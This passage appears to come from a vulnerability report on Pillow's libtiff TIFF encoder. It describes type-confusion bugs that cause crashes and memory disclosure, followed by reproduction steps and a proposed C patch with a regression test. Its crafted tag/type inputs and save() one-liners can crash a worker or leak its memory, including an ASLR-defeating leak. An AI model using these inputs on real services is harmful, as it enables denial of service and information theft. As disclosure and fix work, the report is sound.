PyImaging_LibTiffEncoderNew`), and all are reachable from a sub-1 KB crafted\n\u003e file followed by an ordinary `save()`:\n\u003e \n\u003e * **Typed tuple → `(len, av)` for a fixed-count built-in field**\n\u003e   (`src/encode.c:904-994`, the SHORT/LONG/SBYTE/SSHORT/SLONG/FLOAT/DOUBLE\n\u003e   tuple branches all call `ImagingLibTiffSetField(..., len, av)`). For libtiff\n\u003e   built-in fields with `passcount=0` and a fixed `writecount` —\n\u003e   `CFARepeatPatternDim` 33421 (SHORT×2), `BlackLevelRepeatDim` 50713\n\u003e   (SHORT×2), `ImageLayer` 34732 (LONG×2), `ActiveArea` 50829 (LONG×4),\n\u003e   `MatrixWorldToScreen/Camera` 33305/33306 (FLOAT×16) — libtiff takes the\n\u003e   *first* vararg as the source pointer, so the tuple length becomes the\n\u003e   `memcpy` source address. A perfectly well-formed 206-byte 8×8 PackBits TIFF\n\u003e   carrying `33421 / SHORT / 2 / (2, 2)` re-saved with a bare\n\u003e   `im.save(out, \"TIFF\")` dies with SIGSEGV in `memcpy` (gdb: `rsi = 0x2`, the\n\u003e   tuple length) on every run; so does\n\u003e   `Image.new(\"L\", (8, 8)).save(buf, \"TIFF\", compression=\"packbits\",\n\u003e   tiffinfo={33421: (2, 2)})`, and a JPEG whose EXIF carries the tag saved with\n\u003e   `exif=im.getexif()` into a compressed TIFF. `bytes` values for built-in\n\u003e   fixed-count BYTE tags (e.g. `DNGVersion` 50706, BYTE×4) crash the same way\n\u003e   through the `(PyBytes_Size, PyBytes_AsString)` call at `src/encode.c:860-865`.\n\u003e   The mirror image for `passcount=1` fields: `Photoshop` 34377 declared\n\u003e   SHORT, count 1, value 60000 takes the scalar branch at `:1009-1012`, libtiff\n\u003e   reads 60000 as the count and an unpassed vararg as the pointer, and the\n\u003e   re-save *succeeds* with a 60162-byte output whose tag 34377 holds 60000 bytes\n\u003e   of process memory (here C prototype strings from `_imaging.so`'s `.rodata`).\n\u003e * **`bytes` value → single `char *`** (`src/encode.c:805-815` autodetects\n\u003e   `bytes` as `TIFF_ASCII`; `:1033-1042` passes `PyBytes_AsString(value)` alone).\n\u003e   `ImageFileDirectory_v2._setitem` stores a BYTE-typed entry as bare `bytes`\n\u003e   and an ASCII-typed one as `str` (encoded to `bytes` by `_save`), so the\n\u003e   file's declared type selects this branch.\n\u003e   - `ColorMap` (320) declared BYTE with 4 bytes of data in a non-palette\n\u003e     PackBits TIFF: 320 is in `core_tags[]`, no type is consulted, the value\n\u003e     skips the 768-tuple `TIFFTAG_COLORMAP` branch (`:871-895`) and libtiff reads\n\u003e     three `uint16_t *` and copies `1 \u003c\u003c BitsPerSample` shorts from each — a\n\u003e     512-byte over-read of the 5-byte Python bytes buffer, then dereference of\n\u003e     two stale argument registers → SIGSEGV on every run of\n\u003e     `Image.open(f); im.save(out, \"TIFF\")`. `COLORMAP` is not in `_save`'s\n\u003e     `blocklist`.\n\u003e   - `Photoshop` (34377) declared ASCII: `_save` copies value *and* type\n\u003e     (`TiffImagePlugin.py:1802-1818`; only `IPTC_NAA_CHUNK` has a BYTE/UNDEFINED\n\u003e     type guard there, from commit 2245df0a — `PHOTOSHOP_CHUNK` and `XMP` do\n\u003e     not). libtiff's definition is BYTE, `passcount=1`, so the low 32 bits of\n\u003e     the `char *` become the byte count for a `memcpy` from a stale register\n\u003e     (ASan: `READ of size 3518384`; stock: SIGSEGV in about half of runs,\n\u003e     otherwise `RuntimeError`). `ICCProfile` (34675) declared ASCII behaves the\n\u003e     same way via `im.info[\"icc_profile\"]` → `ifd[ICCPROFILE]`\n\u003e     (`TiffImagePlugin.py:1822-1824`).\n\u003e * **`TIFF_RATIONAL` tuple → array with no count** (`src/encode.c:995-1006`;\n\u003e   compare the `TIFF_FLOAT` branch at `:969-981`, which passes `len, av`).\n\u003e   - For a private tag (e.g. 50000) Pillow itself registers the field with\n\u003e     `passcount=1` (`TiffDecode.c:904-908`), so libtiff takes the low 32 bits of\n\u003e     `av` as the element count and the next stale vararg as the source:\n\u003e     `heap-buffer-overflow READ of size 119872 … right of 8-byte region` under\n\u003e     ASan (`119872 == 4 * low32(av)`), SIGSEGV in ~4 of 5 stock runs. Reached by\n\u003e     a JPEG whose EXIF carries one private RATIONAL×2 tag saved with\n\u003e     `im.save(out, \"TIFF\", compression=\"tiff_lzw\", exif=im.info[\"exif\"])`, or a\n\u003e     TIFF re-saved with `tiffinfo=im.tag_v2` (`_setitem` auto-types a tuple of\n\u003e     `IFDRational` as RATIONAL, `TiffImagePlugin.py:689-701`; `types[tag] =\n\u003e     ifd.tagtype[tag]` at `:1968`).\n\u003e   - For libtiff's built-in fixed-count float tags `WhitePoint` (318, 2),\n\u003e     `PrimaryChromaticities` (319, 6) and `YCbCrCoefficients` (529, 3), which\n\u003e     `_save` forwards from any source TIFF and types RATIONAL via\n\u003e     `TiffTags.lookup`, the pointer-only convention happens to match, but\n\u003e     libtiff copies its *fixed* count from an array that is only as long as the\n\u003e     file declared: a PackBits TIFF with `PrimaryChromaticities` count 1 and a\n\u003e     bare `im.save(out, \"TIFF\")` gives `READ of size 24 … right of 4-byte\n\u003e     region`, and the over-read floats are written to tag 319 of the output.\n\u003e     `REFERENCEBLACKWHITE`/`TRANSFERFUNCTION` are blocklisted at\n\u003e     `TiffImagePlugin.py:1941-1952` for exactly this reason; 318/319/529 are not.\n\u003e * **Core tag reached as a scalar via a stale file-supplied type.** With the\n\u003e   re-save idiom `im.save(out, \"TIFF\", tiffinfo=im.tag_v2)`, `_save` copies\n\u003e   `ifd.tagtype[key] = info.tagtype[key]` for every key\n\u003e   (`TiffImagePlugin.py:1768-1776`) and later assigns its own values to some of\n\u003e   the same tags without resetting the type (`ifd[COLORMAP] = colormap` at\n\u003e   `:1870-1877`; likewise BitsPerSample, SamplesPerPixel, ExtraSamples,\n\u003e   ICCProfile, …). For a 418-byte PackBits *palette* TIFF whose ColorMap entry\n\u003e   is declared BYTE, `_setitem` (`:751-770`) truncates `_save`'s 768-entry\n\u003e   palette to a single `int` (with only a \"too many entries\" warning), the\n\u003e   encoder receives `(320, 0)`, autodetects `TIFF_LONG`, and\n\u003e   `src/encode.c:1013-1016` calls `TIFFSetField(TIFFTAG_COLORMAP, (UINT32)0)` —\n\u003e   libtiff reads three `uint16_t *` and faults at an address ≤ 65280 on every\n\u003e   run. The stale-tagtype copy is a Python-side hygiene bug in its own right,\n\u003e   but its memory-safety consequence exists only because the encoder lets a\n\u003e   non-tuple value reach `TIFFSetField(COLORMAP)`.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Any service that accepts a TIFF and writes it back out as TIFF through libtiff —\n\u003e which happens with a plain `im.save(fp, \"TIFF\")` whenever the uploaded file is\n\u003e compressed, or whenever a `compression=` other than raw is requested — returns\n\u003e to the uploader, inside one metadata tag of the produced file, an\n\u003e attacker-chosen number of bytes read from a stale pointer in the worker process,\n\u003e deterministically and without retries. Which memory that is depends on the\n\u003e compiler's register allocation for `PyImaging_LibTiffEncoderNew`: in this clang\n\u003e build the pointer is `_imaging.so + 0x1588`, so a request for 262 144 bytes\n\u003e (which succeeded every time in testing, as did 2 000 000) covers the\n\u003e extension's `.rodata`, `.data.rel.ro`/GOT and `.data` and returned 2 800+\n\u003e resolved pointers into libpython, libc, libtiff, libjpeg and others — a complete\n\u003e ASLR bypass for chaining with any other memory bug; a gcc build of the same\n\u003e source left a different, unrelated address in that slot. The fixed-count\n\u003e variant kills the worker process with SIGSEGV from a 181-byte upload on every\n\u003e request. With `tiffinfo=im.tag_v2` the source\n\u003e address is fully attacker-chosen (16-byte arbitrary read into the output for\n\u003e ActiveArea, or a crash). No non-default Pillow setting is involved; the only\n\u003e precondition is TIFF-to-TIFF re-encoding.\n\u003e \n\u003e The other branches add further deterministic process-kill inputs (BYTE-typed\n\u003e ColorMap in any RGB or palette TIFF; `thumbnail()` keeps `tag_v2`, so\n\u003e open→thumbnail→save-as-TIFF is affected too) and extend the reach to\n\u003e JPEG/PNG/WebP uploads whose EXIF is preserved with `exif=` when converting to\n\u003e libtiff-compressed TIFF. All the memory errors are reads; libtiff sizes its\n\u003e destination buffers with the same count it copies, so no out-of-bounds write\n\u003e was found.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e `repro` is one Python script, run against the stock build with the installed `PIL`. It needs no compiler and no extra files.\n\u003e \n\u003e `upload(tag, value)` has Pillow write a 16×16 red RGB image as an LZW-compressed TIFF, then appends a new IFD holding the same entries plus one extra `\u003ctag\u003e / LONG / count 1 / value` (kept in tag order) and points the header at it — a 356-byte input on this tree. The source is LZW-compressed on purpose. A bare `im.save(out, \"TIFF\")` keeps the source's compression, so the save goes through the libtiff writer even though the application passes no arguments. `resave()` is the whole \"application\": `Image.open(BytesIO(src)); im.save(out, \"TIFF\")`.\n\u003e \n\u003e The script runs three cases:\n\u003e \n\u003e 1. **Control, tag 65000 = 4096.** libtiff does not know this tag, so the file is re-saved correctly and the output tag reads back as the integer `4096`. This is what should happen to every tag.\n\u003e 2. **Leak, DNGPrivateData 50740 = 65536.** libtiff's built-in definition of this tag is a counted BYTE array. It reads Pillow's single scalar as the *count* and takes the data pointer from a vararg slot Pillow never wrote. The output tag comes back as `bytes` of length 65536 that do not occur in the input. The script prints the first 32 of them and the file offset at which they occur in `_imaging.so` on disk. On this build they always do (offset `0x57588`): the stale pointer aims into the extension's read-only data.\n\u003e 3. **Wild read, ActiveArea 50829 = 64.** libtiff defines this tag as a fixed LONG[4] array with no count, so it uses the scalar 64 as the *source address*. The script re-runs itself as a child process (`repro child`, core dumps disabled) to do this re-save, and the child exits with `-11`, meaning SIGSEGV.\n\u003e \n\u003e Expected output on the affected tree:\n\u003e \n\u003e ```\n\u003e control  tag 65000=4096 -\u003e 4096\n\u003e leak     tag 50740=65536 from a 356-byte upload -\u003e 65536 bytes not present in input, head a661fcffc661fcff3360fcff7b61fcffd361fcff085ffcffe061fcff3360fcff\n\u003e          leaked bytes found in _imaging.so at file offset 0x57588\n\u003e crash    tag 50829=64 -\u003e child exit -11 (SIGSEGV)\n\u003e BUG\n\u003e ```\n\u003e \n\u003e The script prints `BUG` if case 2 leaks or case 3 crashes. Both are deterministic on this build. A fixed Pillow prints `OK`: the tag does not come back as 65536 bytes of foreign data (it reads back as `None`, or `save()` raises `ValueError`/`RuntimeError`, which the script catches), and the child exits with something other than SIGSEGV (0, or 1 if `save()` raised).\n\u003e \n\u003e The other branches can be checked by hand on the stock build in the same way\n\u003e (each as `Image.open(f); im.save(BytesIO(), \"TIFF\")` in a child process):\n\u003e a PackBits RGB TIFF with an extra IFD entry `320 / BYTE / 4 / \"ABCD\"` →\n\u003e SIGSEGV every run; a PackBits palette TIFF whose ColorMap is `320 / BYTE / 2`\n\u003e saved with `tiffinfo=im.tag_v2` → SIGSEGV every run; a Pillow-written JPEG\n\u003e whose EXIF holds tag 50000 = RATIONAL×2 saved with\n\u003e `compression=\"tiff_lzw\", exif=im.info[\"exif\"]` → SIGSEGV in most runs,\n\u003e `RuntimeError` (\"Failed to allocate memory for custom tag binary object\n\u003e (-N elements of 4 bytes each)\") in the rest.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e The encoder must not guess the calling convention; it has to ask libtiff what\n\u003e the tag's effective definition is *after* `ImagingLibTiffMergeFieldInfo` and\n\u003e marshal accordingly, or refuse. The attached patch does this for non-core tags:\n\u003e \n\u003e * a new `ImagingLibTiffFindField()` in `src/libImaging/TiffDecode.c` (declared\n\u003e   in `TiffDecode.h`, next to the other libtiff wrappers) returns libtiff's\n\u003e   `TIFFFindField` type, `passcount` and `writecount` for a tag;\n\u003e * in `PyImaging_LibTiffEncoderNew` (`src/encode.c`), for a non-core tag that\n\u003e   libtiff already knows, Pillow adopts libtiff's type when it has none of its\n\u003e   own, and after `ImagingLibTiffMergeFieldInfo` a new `tiff_field_matches()`\n\u003e   checks the value against libtiff's definition: a scalar only for a\n\u003e   single-value field whose C argument type (int / `uint64_t` / double /\n\u003e   `char *`) matches, an array only with libtiff's element size and, for\n\u003e   fixed-count fields, exactly `writecount` elements. Anything else raises\n\u003e   `ValueError(\"Tag value does not match libtiff field definition\")` instead of\n\u003e   reaching `TIFFSetField` — this covers the reproducer's DNGPrivateData and\n\u003e   ActiveArea inputs, ASCII-typed Photoshop, short PrimaryChromaticities and the\n\u003e   `LONG8` `tiffinfo=` variant;\n\u003e * every tuple/`bytes` branch now goes through `set_tiff_array_field()`, which\n\u003e   passes `len` only when the field has `passcount` set; this also fixes the\n\u003e   `TIFF_RATIONAL` branch, which never passed a count (and extends it to\n\u003e   `TIFF_SRATIONAL`);\n\u003e * `TIFF_UNDEFINED` fields are registered as variable-length, matching how their\n\u003e   `bytes` values are passed;\n\u003e * `Tests/test_file_libtiff.py` gains a regression test (scalar DNGPrivateData,\n\u003e   scalar and 2-tuple ActiveArea rejected; well-formed values round-trip).\n\u003e \n\u003e Core tags and tags libtiff does not know keep their current behaviour. With the\n\u003e patch applied to a clean checkout and rebuilt, the reproducer no longer\n\u003e triggers and the test suite passes. It is not a complete fix, however: the\n\u003e whole check sits inside `if (!is_core_tag)`, so the BYTE-typed ColorMap variant\n\u003e stays open. The PackBits RGB TIFF carrying `320 / BYTE / 4`, re-saved with a\n\u003e bare `save()`, no longer segfaults at this point but writes 1536 bytes —\n\u003e over-read from the 5-byte `bytes` object and two stale varargs, including 22\n\u003e live heap pointers — into the output ColorMap, which is still a disclosure.\n\u003e Before merging, it needs a guard that accepts `TIFFTAG_COLORMAP` only through\n\u003e the existing 768-tuple branch, never through the scalar or `bytes` branches,\n\u003e and ideally the same shape check for the other core tags libtiff special-cases\n\u003e in `_TIFFVSetField` (YCbCrSubsampling 530, TransferFunction 301,\n\u003e ReferenceBlackWhite 532).\n\u003e \n\u003e Narrower Python-side mitigations in `_save` close individual entry points but\n\u003e not the class, and are worth adding alongside the C-side check: drop tags\n\u003e with `TiffTags.lookup(tag).type is None` from `supplied_tags` (closes the `Image.open()→save()` path shown here but not\n\u003e `tiffinfo=` callers); remove `COLORMAP` from `supplied_tags` next to\n\u003e `EXIFIFD`/`SAMPLEFORMAT` and extend the `IPTC_NAA_CHUNK` BYTE/UNDEFINED type\n\u003e guard to `PHOTOSHOP_CHUNK` and `XMP`; add 318/319/529 to the blocklist next to\n\u003e `REFERENCEBLACKWHITE`; and have `_save` `ifd.tagtype.pop(tag, None)` before\n\u003e assigning its own ColorMap/BitsPerSample/ICCProfile/… values so a\n\u003e `tiffinfo=`-imported type cannot reshape them. The C-side check is the fix to\n\u003e rely on.\n\u003e \n\u003e ## The patch\n\u003e \n\u003e Pass TIFF tag values to libtiff according to its own field definition, and raise ValueError when they do not fit\n\u003e \n\u003e Applies to `src/encode.c` at the commit above. It passed the mechanical check — applied to a clean tree, rebuilt, the reproducer stopped firing — but a reviewer did not endorse it as the right fix.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\n\u003e index 3d804ea4a..adc4633e4 100644\n\u003e --- a/Tests/test_file_libtiff.py\n\u003e +++ b/Tests/test_file_libtiff.py\n\u003e @@ -395,6 +395,43 @@ class TestFileLibTiff(LibTiffTestCase):\n\u003e          with pytest.raises(ValueError, match=\"Incorrect tag value type\"):\n\u003e              im.save(out, tiffinfo=ifd)\n\u003e  \n\u003e +    @pytest.mark.parametrize(\n\u003e +        \"tag, value\",\n\u003e +        (\n\u003e +            # DNGPrivateData is a BYTE array with a count to libtiff\n\u003e +            (50740, 4096),\n\u003e +            # ActiveArea is a LONG array of four values to libtiff\n\u003e +            (50829, 64),\n\u003e +            (50829, (0, 0)),\n\u003e +        ),\n\u003e +    )\n\u003e +    def test_libtiff_field_definition(\n\u003e +        self, tag: int, value: Any, monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n\u003e +    ) -\u003e None:\n\u003e +        monkeypatch.setattr(TiffImagePlugin, \"WRITE_LIBTIFF\", True)\n\u003e +\n\u003e +        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n\u003e +        ifd[tag] = value\n\u003e +        ifd.tagtype[tag] = TiffTags.LONG\n\u003e +\n\u003e +        out = tmp_path / \"temp.tif\"\n\u003e +        im = Image.new(\"L\", (1, 1))\n\u003e +        with pytest.raises(ValueError, match=\"libtiff field definition\"):\n\u003e +            im.save(out, tiffinfo=ifd)\n\u003e +\n\u003e +        # Values that match the libtiff definition are written\n\u003e +        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n\u003e +        ifd[50740] = b\"private\"\n\u003e +        ifd.tagtype[50740] = TiffTags.BYTE\n\u003e +        ifd[50829] = (0, 0, 1, 1)\n\u003e +        ifd.tagtype[50829] = TiffTags.LONG\n\u003e +        im.save(out, tiffinfo=ifd)\n\u003e +\n\u003e +        with Image.open(out) as reloaded:\n\u003e +            assert isinstance(reloaded, TiffImagePlugin.TiffImageFile)\n\u003e +            assert reloaded.tag_v2[50740] == b\"private\"\n\u003e +            assert reloaded.tag_v2[50829] == (0, 0, 1, 1)\n\u003e +\n\u003e      def test_inknames_tag(\n\u003e          self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n\u003e      ) -\u003e None:\n\u003e diff --git a/src/encode.c b/src/encode.c\n\u003e index 9e19e9002..cbbd09f0d 100644\n\u003e --- a/src/encode.c\n\u003e +++ b/src/encode.c\n\u003e @@ -675,6 +675,106 @@ PyImaging_ZipEncoderNew(PyObject *self, PyObject *args) {\n\u003e  \n\u003e  #include \u003cstring.h\u003e\n\u003e  \n\u003e +/* C type that TIFFSetField reads from its arguments for a single value of\n\u003e +   the given type: int, uint64_t, double or char * */\n\u003e +static int\n\u003e +tiff_scalar_arg_type(TIFFDataType type) {\n\u003e +    switch (type) {\n\u003e +        case TIFF_BYTE:\n\u003e +        case TIFF_SBYTE:\n\u003e +        case TIFF_UNDEFINED:\n\u003e +        case TIFF_SHORT:\n\u003e +        case TIFF_SSHORT:\n\u003e +        case TIFF_LONG:\n\u003e +        case TIFF_SLONG:\n\u003e +        case TIFF_IFD:\n\u003e +            return 1;\n\u003e +        case TIFF_LONG8:\n\u003e +        case TIFF_SLONG8:\n\u003e +        case TIFF_IFD8:\n\u003e +            return 2;\n\u003e +        case TIFF_FLOAT:\n\u003e +        case TIFF_DOUBLE:\n\u003e +        case TIFF_RATIONAL:\n\u003e +        case TIFF_SRATIONAL:\n\u003e +            return 3;\n\u003e +        case TIFF_ASCII:\n\u003e +            return 4;\n\u003e +        default:\n\u003e +            return 0;\n\u003e +    }\n\u003e +}\n\u003e +\n\u003e +/* Size of the values that TIFFSetField copies from an array of the given\n\u003e +   type. libtiff stores custom RATIONAL arrays as floats. */\n\u003e +static int\n\u003e +tiff_array_item_size(TIFFDataType type) {\n\u003e +    switch (type) {\n\u003e +        case TIFF_BYTE:\n\u003e +        case TIFF_SBYTE:\n\u003e +        case TIFF_UNDEFINED:\n\u003e +        case TIFF_ASCII:\n\u003e +            return 1;\n\u003e +        case TIFF_SHORT:\n\u003e +        case TIFF_SSHORT:\n\u003e +            return 2;\n\u003e +        case TIFF_LONG:\n\u003e +        case TIFF_SLONG:\n\u003e +        case TIFF_IFD:\n\u003e +        case TIFF_FLOAT:\n\u003e +        case TIFF_RATIONAL:\n\u003e +        case TIFF_SRATIONAL:\n\u003e +            return 4;\n\u003e +        case TIFF_DOUBLE:\n\u003e +        case TIFF_LONG8:\n\u003e +        case TIFF_SLONG8:\n\u003e +        case TIFF_IFD8:\n\u003e +            return 8;\n\u003e +        default:\n\u003e +            return 0;\n\u003e +    }\n\u003e +}\n\u003e +\n\u003e +/* Check that a value which will be passed to TIFFSetField as a single value\n\u003e +   of the given type, or as an array of len values, matches the definition\n\u003e +   of the field that libtiff will use. */\n\u003e +static int\n\u003e +tiff_field_matches(\n\u003e +    TIFFDataType field_type,\n\u003e +    int passcount,\n\u003e +    int writecount,\n\u003e +    TIFFDataType type,\n\u003e +    int is_var_length,\n\u003e +    Py_ssize_t len\n\u003e +) {\n\u003e +    if (field_type == TIFF_ASCII \u0026\u0026 !passcount) {\n\u003e +        // TIFFSetField reads a null-terminated string\n\u003e +        return !is_var_length \u0026\u0026 type == TIFF_ASCII;\n\u003e +    }\n\u003e +    if (!is_var_length) {\n\u003e +        // TIFFSetField reads a single value\n\u003e +        return !passcount \u0026\u0026 writecount == 1 \u0026\u0026 tiff_scalar_arg_type(type) \u0026\u0026\n\u003e +               tiff_scalar_arg_type(type) == tiff_scalar_arg_type(field_type);\n\u003e +    }\n\u003e +    // TIFFSetField reads a pointer to the values, preceded by the number of\n\u003e +    // values if passcount is set. Otherwise, the number of values is fixed.\n\u003e +    if (!tiff_array_item_size(type) ||\n\u003e +        tiff_array_item_size(type) != tiff_array_item_size(field_type)) {\n\u003e +        return 0;\n\u003e +    }\n\u003e +    return passcount || (writecount \u003e 1 \u0026\u0026 len == writecount);\n\u003e +}\n\u003e +\n\u003e +static int\n\u003e +set_tiff_array_field(\n\u003e +    ImagingCodecState state, int key, int passcount, Py_ssize_t len, void *av\n\u003e +) {\n\u003e +    if (passcount) {\n\u003e +        return ImagingLibTiffSetField(state, (ttag_t)key, len, av);\n\u003e +    }\n\u003e +    return ImagingLibTiffSetField(state, (ttag_t)key, av);\n\u003e +}\n\u003e +\n\u003e  PyObject *\n\u003e  PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e      ImagingEncoderObject *encoder;\n\u003e @@ -689,7 +789,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e      PyObject *key, *value;\n\u003e      Py_ssize_t pos = 0;\n\u003e      int key_int, status, is_core_tag, is_var_length, num_core_tags, i;\n\u003e -    TIFFDataType type = TIFF_NOTYPE;\n\u003e +    int is_known_tag, passcount, writecount;\n\u003e +    TIFFDataType type = TIFF_NOTYPE, field_type;\n\u003e      // This list also exists in TiffTags.py\n\u003e      const int core_tags[] = {256, 257, 258,   259,   262,   263,   266,  269, 274, 277,\n\u003e                               278, 280, 281,   282,   283,   284,   286,  287, 296, 297,\n\u003e @@ -777,6 +878,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e          status = 0;\n\u003e          is_core_tag = 0;\n\u003e          is_var_length = 0;\n\u003e +        is_known_tag = 0;\n\u003e +        passcount = 1;\n\u003e          type = TIFF_NOTYPE;\n\u003e  \n\u003e          for (i = 0; i \u003c num_core_tags; i++) {\n\u003e @@ -800,6 +903,15 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                  }\n\u003e                  Py_DECREF(tag_type);\n\u003e              }\n\u003e +\n\u003e +            // libtiff uses its own definition for tags that it already knows,\n\u003e +            // rather than the field registered below.\n\u003e +            is_known_tag = ImagingLibTiffFindField(\n\u003e +                \u0026encoder-\u003estate, key_int, \u0026field_type, \u0026passcount, \u0026writecount\n\u003e +            );\n\u003e +            if (is_known_tag \u0026\u0026 type == TIFF_NOTYPE) {\n\u003e +                type = field_type;\n\u003e +            }\n\u003e          }\n\u003e  \n\u003e          if (type == TIFF_NOTYPE) {\n\u003e @@ -838,7 +950,7 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e  \n\u003e          if (!is_core_tag) {\n\u003e              // Register field for non core tags.\n\u003e -            if (type == TIFF_BYTE) {\n\u003e +            if (type == TIFF_BYTE || type == TIFF_UNDEFINED) {\n\u003e                  is_var_length = 1;\n\u003e              }\n\u003e              if (ImagingLibTiffMergeFieldInfo(\n\u003e @@ -847,6 +959,28 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                  Py_DECREF(item);\n\u003e                  continue;\n\u003e              }\n\u003e +\n\u003e +            if (is_known_tag) {\n\u003e +                // Check that the value will be passed to TIFFSetField in the\n\u003e +                // form that libtiff's definition of the tag expects.\n\u003e +                Py_ssize_t len = 0;\n\u003e +                if (PyTuple_Check(value)) {\n\u003e +                    len = PyTuple_Size(value);\n\u003e +                } else if (PyBytes_Check(value)) {\n\u003e +                    len = PyBytes_Size(value);\n\u003e +                }\n\u003e +                if (!tiff_field_matches(\n\u003e +                        field_type, passcount, writecount, type, is_var_length, len\n\u003e +                    )) {\n\u003e +                    Py_DECREF(encoder);\n\u003e +                    Py_DECREF(item);\n\u003e +                    PyErr_SetString(\n\u003e +                        PyExc_ValueError,\n\u003e +                        \"Tag value does not match libtiff field definition\"\n\u003e +                    );\n\u003e +                    return NULL;\n\u003e +                }\n\u003e +            }\n\u003e          }\n\u003e  \n\u003e          if (type == TIFF_BYTE || type == TIFF_UNDEFINED ||\n\u003e @@ -857,9 +991,10 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                  PyErr_SetString(PyExc_ValueError, \"Incorrect tag value type\");\n\u003e                  return NULL;\n\u003e              }\n\u003e -            status = ImagingLibTiffSetField(\n\u003e +            status = set_tiff_array_field(\n\u003e                  \u0026encoder-\u003estate,\n\u003e -                (ttag_t)key_int,\n\u003e +                key_int,\n\u003e +                passcount,\n\u003e                  PyBytes_Size(value),\n\u003e                  PyBytes_AsString(value)\n\u003e              );\n\u003e @@ -909,8 +1044,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (UINT16)PyLong_AsLong(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -922,8 +1057,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (UINT32)PyLong_AsLong(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -935,8 +1070,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (INT8)PyLong_AsLong(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -948,8 +1083,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (INT16)PyLong_AsLong(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -961,8 +1096,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (INT32)PyLong_AsLong(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -974,8 +1109,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (FLOAT32)PyFloat_AsDouble(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -987,12 +1122,12 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = PyFloat_AsDouble(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e -            } else if (type == TIFF_RATIONAL) {\n\u003e +            } else if (type == TIFF_RATIONAL || type == TIFF_SRATIONAL) {\n\u003e                  FLOAT32 *av;\n\u003e                  /* malloc check ok, calloc checks for overflow */\n\u003e                  av = calloc(len, sizeof(FLOAT32));\n\u003e @@ -1000,8 +1135,9 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (FLOAT32)PyFloat_AsDouble(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status =\n\u003e -                        ImagingLibTiffSetField(\u0026encoder-\u003estate, (ttag_t)key_int, av);\n\u003e +                    status = 